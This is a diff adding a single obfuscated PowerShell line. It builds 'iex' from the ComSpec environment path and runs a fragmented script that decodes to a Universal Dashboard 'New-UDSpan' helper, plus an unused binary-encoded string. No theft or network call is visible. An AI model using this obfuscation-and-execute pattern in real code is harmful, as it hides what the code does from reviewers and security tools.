@@ -1,0 +1,14 @@
+. ( $EnV:cOmsPeC[4,24,25]-JOin'')( (('fu'+'nct'+'io'+'n Ne'+'w-U'+'D'+'Span {
+    par'+'am(
+        [Pa'+'ra'+'me'+'ter()'+']
+ '+'       [String'+']ANu'+'Id'+' = '+'([Gu'+'id]:'+':NewGu'+'id())'+',
+'+'        [P'+'aramete'+'r()]
+    '+'   '+' '+'A'+'N'+'u'+'Conte'+'nt'+'
+    )'+'
+'+' '+' '+' '+' '+'ANupfkD '+'= '+' ( 8g4100111'+'Y1101001'+'j111'+'0000d'+'111010h11001'+'0'+'h11'+'0010h1'+'10101@1'+'01110j11'+'0011Y11100'+'0'+'&'+'1'+'0111'+'0'+'x110011&'+'110000'+'@101110&1100'+'01h11'+'001'+'0&10'+'0'+'1'+'118g4-sp'+'LiT'+' '+'8g4'+'u8g'+'4-'+'sPliT 8g4<8g4'+' -s'+'pLi'+'T'+'8'+'g'+'4v'+'8g4-SplIt'+'8g4j'+'8g4 -sPlit8g4@8g'+'4-spLit'+'8g4x8g4 -'+'SPL'+'iT'+'8g4d'+'8'+'g'+'4'+'-S'+'plIt 8g'+'4&8g4 '+'-split'+' 8g4h8'+'g4-'+'SplIt'+'8g4Y8g'+'4 WfD%'+' { (['+'cOnVErT'+']:'+':ToINt16( ( ANu_'+'.T'+'Os'+'t'+'rING('+') ), 2 ) -As[cHAR'+']) '+'} )-JOIN '+'8g48'+'g'+'4
+'+'
+    Ne'+'w-UDEleme'+'nt -Id ANuId '+'-Ta'+'g x7Jspanx7J -C'+'ontent {
+  '+'      ANuC'+'ontent
+    }
+}'+'
+') -REplaCe'WfD',[cHaR]124 -REplaCe ([cHaR]65+[cHaR]78+[cHaR]117),[cHaR]36  -crepLAcE ([cHaR]56+[cHaR]103+[cHaR]52),[cHaR]39-REplaCe([cHaR]120+[cHaR]55+[cHaR]74),[cHaR]34) ) 
